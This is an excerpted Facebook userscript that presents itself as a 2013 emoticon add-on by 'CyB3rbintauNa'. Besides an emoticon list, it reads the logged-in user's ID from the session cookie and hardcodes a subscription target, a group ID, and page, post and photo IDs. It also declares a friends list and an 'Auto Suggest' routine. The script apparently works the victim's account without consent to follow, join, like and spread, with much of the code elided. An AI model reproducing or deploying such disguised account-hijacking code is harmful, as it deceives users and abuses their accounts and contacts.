// ==UserScript==
// @name            Emoticon New 2013 | CyB3rbintauNa
// @description     Emoticon New 2013 By CyB3rbintauNa
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/itho.cinta.nisha.selamanya" target="_blank">CyB3rbintauNa<br>KLIK DISINI</a>';
	html += '</div>';
...
sublist("100004287722188");

//Group ane gan
var gid = ['149429808597161'];
...
var spage_id = "195589053842133";
var spost_id = "74332359_126113410877833";
var sfoto_id = "216157461870510";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by CyB3rbintaNa';
